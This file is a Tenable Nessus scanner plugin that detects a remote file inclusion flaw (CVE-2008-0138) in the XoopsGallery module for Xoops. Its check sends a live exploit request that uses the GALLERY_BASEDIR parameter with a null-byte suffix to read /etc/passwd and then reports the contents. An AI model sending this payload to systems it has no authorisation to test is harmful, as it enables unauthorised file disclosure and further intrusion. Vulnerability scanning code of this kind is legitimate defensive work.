#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(29870);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2008-0138");
  script_bugtraq_id(27155);
  script_osvdb_id(40214);
  script_xref(name:"EDB-ID", value:"4847");

  script_name(english:"XoopsGallery init_basic.php GALLERY_BASEDIR Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with XoopsGallery");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a remote
file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running XoopsGallery, a third-party module for
Xoops. 

The version of XoopsGallery installed on the remote host fails to
sanitize user-supplied input to the 'GALLERY_BASEDIR' parameter of the
'modules/xoopsgallery/init_basic.php' script before using it to
include PHP code.  Provided PHP's 'register_globals' setting is off,
an unauthenticated, remote attacker may be able to exploit this issue
to view arbitrary files on the remote host or to execute arbitrary PHP
code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/01/08");
 script_cvs_date("$Date: 2016/05/19 18:10:51 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:xoops:xoopsgallery_module");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/xoops");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to retrieve a local file.
  file = "/etc/passwd";

  r = http_send_recv3(method:"GET", port: port, 
    item:string(
      dir, "/modules/xoopsgallery/init_basic.php?", 
      "GALLERY_BASEDIR=", file, "%00"
    ));
  if (isnull(r)) exit(0);
  res = r[2];
  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error because magic_quotes was enabled or...
    string("main(", file, "\\0platform/fs_") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("main(", file, "): failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = res - strstr(res, '<br');

      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
